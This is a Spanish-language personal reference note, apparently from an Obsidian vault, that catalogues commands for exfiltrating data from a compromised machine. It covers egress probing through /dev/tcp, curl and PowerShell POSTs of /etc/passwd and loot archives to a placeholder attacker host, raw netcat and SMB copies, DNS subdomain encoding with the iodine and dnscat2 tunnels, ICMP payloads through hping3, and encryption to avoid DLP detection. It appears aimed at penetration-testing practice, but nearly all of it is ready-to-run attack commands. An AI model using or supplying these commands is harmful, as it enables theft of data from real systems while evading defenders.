---
tipo: meta
aliases:
  - Exfiltración - matriz
  - exfil cheatsheet
tags:
  - meta/referencia
  - dominio/post-explotacion
---

# Exfiltración - matriz de referencia

> [!info] Referencia pura, no un zettel
> Comandos para **sacar** datos del objetivo. El criterio —canal abierto contra encubierto— vive en [[MOC - Transferencia de archivos]], [[Exfiltración por canal abierto]] y [[Exfiltración por canal encubierto]]. Para traer, [[Transferencia de archivos - matriz de referencia]].

## Probar qué sale (egress)

Antes de exfiltrar, medir qué protocolo/puerto llega a tu box.
Escuchar todo en el box: `nc -lvnp PUERTO` y probar desde el objetivo.
Barrido rápido de puertos de salida:
`for p in 443 80 53 8080 22; do timeout 2 bash -c "echo > /dev/tcp/ATACANTE/$p" && echo "$p abierto"; done`
DNS a tu autoritativo (¿resuelve afuera?): `nslookup test.TU-DOMINIO.com`

## Canal abierto — HTTP / FTP / SMB

HTTP `POST` del archivo (Linux):
`curl -X POST --data-binary @/etc/passwd http://ATACANTE/`
`curl -F 'f=@/etc/passwd' http://ATACANTE/up`

HTTP (Windows / PowerShell):
`powershell -c "Invoke-WebRequest -Uri http://ATACANTE/ -Method POST -InFile c:\loot.zip"`

Recibir el `POST` en el box: `python3 -m http.server 80` (queda en el log) o un `nc -lvnp 80`.

`nc` crudo:
objetivo: `nc ATACANTE 4444 < loot.zip`
box: `nc -lvnp 4444 > loot.zip`

A un SMB del atacante:
`copy c:\loot.zip \\ATACANTE\share\`

## Canal encubierto — DNS

Datos codificados en los subdominios que consulta el objetivo; se leen en tu autoritativo.

Manual, un trozo por consulta (Linux):
`d=$(base32 -w0 secret.txt | tr -d '='); for i in $(echo $d | fold -w32); do nslookup $i.TU-DOMINIO.com; done`

Herramientas de túnel (canal bidireccional):
`iodine -f -P clave TU-IP tunel.TU-DOMINIO.com`  (servidor y cliente)
`dnscat2-server TU-DOMINIO.com`  +  `dnscat2 TU-DOMINIO.com`  (cliente en el objetivo)

Del lado del box, capturar las consultas: correr un autoritativo propio, o `tcpdump -i any udp port 53`.

## Canal encubierto — ICMP

Datos en el payload del echo.
`hping3 ATACANTE --icmp -d 1400 --file secret.txt --sign x`
Túnel completo: `ptunnel-ng` (servidor en el box, cliente en el objetivo).
`nc` sobre ICMP no existe nativo — hace falta una herramienta de túnel.

## Reducir volumen y firma

Comprimir antes: `tar czf - dir | ...` reduce trozos y tiempo.
Cifrar para que el contenido no dispare DLP: `... | openssl enc -aes-256-cbc -pbkdf2 -k clave`.
La entropía alta en DNS es justo lo que detecta [[Exfiltración por subdominios de alta entropía]] — comprimir sube el retorno pero también la entropía; es un compromiso, no una evasión.

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| DNS no llega al box | resolutor interno sin recursión | probar otro resolutor, o cambiar de canal |
| trozos DNS rechazados | etiqueta > 63 chars | `fold -w32` o menos por etiqueta |
| ICMP no vuelve | echo saliente filtrado | pasar a DNS |
| `POST` sin cuerpo en el log | server no guarda body | usar un receptor que lo escriba, no `http.server` |
